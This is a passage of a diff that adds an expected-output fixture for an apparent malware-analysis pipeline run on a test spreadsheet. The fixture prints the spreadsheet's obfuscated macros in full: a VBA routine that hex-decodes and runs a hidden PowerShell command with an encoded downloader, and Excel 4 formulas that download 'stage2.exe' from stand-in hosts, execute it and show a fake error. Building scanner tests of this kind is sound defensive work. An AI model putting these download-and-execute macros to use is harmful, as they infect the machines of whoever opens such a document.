\"MAOgAvAC8AcwBlAHgAYwByAGEAZgB0AC4AYwBsAHUAYgAvADMAOAA3ADEAMwA1ADYANgAzACIAIAArACAAIgA3ADMANQA3ADAAMwAyADMAMwA2ADMAMwA1ACIAIAArACAAIgA2AGUAMwA4ADMANQAzADIANgBlADcAMAA3ADYANgA2ADYAIgAgACsAIAAiAGYANgAxADMAMwA3ADcAMwA1ADMAOAA2AGUALwBwAHMAcwBhAHcAOQAzADcAIgAgACsAIAAiADMANQBtAGkAeQBwAHMALwAiADsAJAB3AEMALgBIAEUAQQBkAGUAcgBTAC4AQQBkAGQAKAAiAFUAcwBlAHIALQBBAGcAZQBuAHQAIgAsACIAVwBpAG4ASAB0AHQAcAAiACkAOwAkAHcAQwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAbABuAGsAcAByACkAOwB9AGMAYQB0AGMAaAB7AH0A\"\npt = asalvxeqskzr(\"70\") & asalvxeqskzr(\"6f\") & asalvxeqskzr(\"776572\")\nsh = asalvxeqskzr(\"73\") & asalvxeqskzr(\"6865\") & asalvxeqskzr(\"6c6c\")\nbars = asalvxeqskzr(\"202d\") & asalvxeqskzr(\"457865\") & asalvxeqskzr(\"63\") & asalvxeqskzr(\"7574696f\") & asalvxeqskzr(\"6e\") & asalvxeqskzr(\"506f6c\") & asalvxeqskzr(\"69637920\") & asalvxeqskzr(\"62\") & asalvxeqskzr(\"7970\") & asalvxeqskzr(\"6173\") & asalvxeqskzr(\"73202d6e\") & asalvxeqskzr(\"6f70\") & asalvxeqskzr(\"726f66\") & asalvxeqskzr(\"696c65\") & asalvxeqskzr(\"202d\") & asalvxeqskzr(\"77696e\") & asalvxeqskzr(\"64\") & asalvxeqskzr(\"6f777374\") & asalvxeqskzr(\"796c6520\") & asalvxeqskzr(\"68\") & asalvxeqskzr(\"69\") & asalvxeqskzr(\"646465\") & asalvxeqskzr(\"6e202d\") & asalvxeqskzr(\"65\") & asalvxeqskzr(\"6e\") & asalvxeqskzr(\"6320\")\njpgwdcjerskbupfdyr.Run pt & sh & bars & cod & cod2, 0\nErsr:\nEnd Function\nPrivate Function asalvxeqskzr(ByVal msybfiemglor As String) As String\nDim uqrmfktnkywt As Long\nFor uqrmfktnkywt = 1 To Len(msybfiemglor) Step 2\nasalvxeqskzr = asalvxeqskzr & Chr$(Val(\"&H\" & Mid$(msybfiemglor, uqrmfktnkywt, 2)))\nNext uqrmfktnkywt\nEnd Function\n\n",
+                "vba_filename": "ThisDocument.cls"
+              },
+              {
+                "file_name": "xlm_macro",
+                "local_path": "a232b79858b25e9cbdeb5ffe4ede84d5ff2b62141bb973d8497a34e18c0bb0e7",
+                "stream_path": "xlm_macro",
+                "vba_code": "' RAW EXCEL4/XLM MACRO FORMULAS:\n' SHEET: Macro1, Macrosheet\n' CELL:A1, =FORMULA(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(120)&CHAR(108)&CHAR(109)&CHAR(45)&CHAR(98)&CHAR(117)&CHAR(105)&CHAR(108)&CHAR(116)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(97)&CHAR(109)&CHAR(112)&CHAR(108)&CHAR(101)&CHAR(46)&CHAR(99)&CHAR(111)&CHAR(109)&CHAR(47)&CHAR(115)&CHAR(116)&CHAR(97)&CHAR(103)&CHAR(101)&CHAR(50)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101),A12), None\n' CELL:A2, =FORMULA(\"c:\\users\\public\\é日本.exe\",A13), None\n' CELL:A3, =CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0,A12,A13,0,0), None\n' CELL:A4, =EXEC(\"cmd /c \"&A13), None\n' CELL:A5, =ALERT(\"The workbook cannot be opened\",2), None\n' CELL:A6, =IF(1=2,GOTO(A11),), None\n' CELL:A7, =CALL(\"wininet\",\"InternetOpenUrlA\",\"JJCJJJ\",0,\"https://xlm-plain.example.com/a?b=1\",0,0,0), None\n' CELL:A8, =CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"HTTP://Upper.example.com/a b\",0), None\n' CELL:A9, =CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"http://%\",0), None\n' CELL:A10, =HALT(), None\n' CELL:A11, =EXEC(\"never.exe\"), None\n' CELL:A12, =0, None\n' CELL:A13, =0, None\n' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n' EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:\n' CELL:A1        , FullEvaluation      , FORMULA(\"http://xlm-built.example.com/stage2.exe\",A12)\n' CELL:A2        , FullEvaluation      , FORMULA(\"c:\\users\\public\\é日本.exe\",A13)\n' CELL:A3        , FullEvaluation      , CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0,\"http://xlm-built.example.com/stage2.exe\",\"c:\\users\\public\\é日本.exe\",0,0)\n' CELL:A4        , PartialEvaluation   , =EXEC(\"cmd /c c:\\users\\public\\é日本.exe\")\n' CELL:A5        , PartialEvaluation   , =ALERT(\"The workbook cannot be opened\",2)\n' CELL:A6        , FullEvaluation      , IF(1=2,GOTO(A11),)\n' CELL:A7        , FullEvaluation      , CALL(\"wininet\",\"InternetOpenUrlA\",\"JJCJJJ\",0,\"https://xlm-plain.example.com/a?b=1\",0,0,0)\n' CELL:A8        , FullEvaluation      , CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"HTTP://Upper.example.com/a b\",0)\n' CELL:A9        , FullEvaluation      , CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"http://%\",0)\n' CELL:A10       , End                 , HALT()",
+                "vba_filename": "xlm_macro.txt"
+              }
+            ],
+            "type": "OpenXML"
+          },
+          "summary": "OLEVBA Analysis: (2 macro files) (OpenXML) | autoexec=1, suspicious=1, ioc=1, hex string=1, base64 string=1",
+          "tags": {}
+        },
+        "pcodedmp": {
+          "details": {
+            "line_count": 435
+          },
+          "summary": "PCode Analysis: decoded 435 lines",
+          "tags": {}
+        },
+        "xlmdeobfuscator": {
+          "details": {
+            "cell_count": 13
+          },
+          "summary": "XLMMacroDeobfuscator Analysis - analyzed 13 cells",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "olevba": true,
+        "xlm4": true,
+        "zip": true
+      }
+    },
+    "file:fad6cc33adbceef8f1dfffc77512072d2bd024ae5e88264b4c5b83582de1e3bd": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.extracted/[Content_Types].xml": {}
+      },
+      "redirection": "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412",
+      "relationships": {
+        "extracted_from file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text (text/xml)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:fdd5371358d6cdbba086ef4bfee44392840e7ebaa7d9ee07f6a3e3338fb1c8b7": {
+      "detections": {},
+      "directives": {
+        "crawl_extracted_urls": true,
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.xlmdeobfuscator/xlmdeobfuscatorextractcells.stdout": {
+          "type=script.macro.xlm": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "Unicode text, UTF-8 text, with very long lines (405)"
+          },
+          "summary": "File Type Analysis: Unicode text, UTF-8 text, with very long lines (405) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:fe0957024595307c9b083effc3231498bc7b7945d28bc1d5aa6d97d9e0729c25": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.pcode.bas": {
+          "type=script.vbscript": true
+        }
+      },
+      "redirection": "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with very long lines (695)"
+          },
+          "summary": "File Type Analysis: ASCII text, with very long lines (695) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "url:HTTP://Upper.example.com/a b": {
+      "detections": {},
+      "directives": {
+        "crawl": true
+      },
+      "excluded_analysis": {},
+      "relationships": {},
+      "results": {},
+      "tags": {}
+    },
+    "url:http://xlm-built.example.com/stage2.exe": {
+      "detections": {},
+      "directives": {
+        "crawl": true
+      },
+      "excluded_analysis": {},
+      "relationships": {},
+      "results": {},
+      "tags": {}
+    },
+    "url:https://xlm-plain.example.com/a?b=1": {
+      "detections": {},
+      "directives": {
+        "crawl": true
+      },
+      "excluded_analysis": {},
+      "relationships": {},
+      "results": {},
+      "tags": {}
+    }
+  }
+}
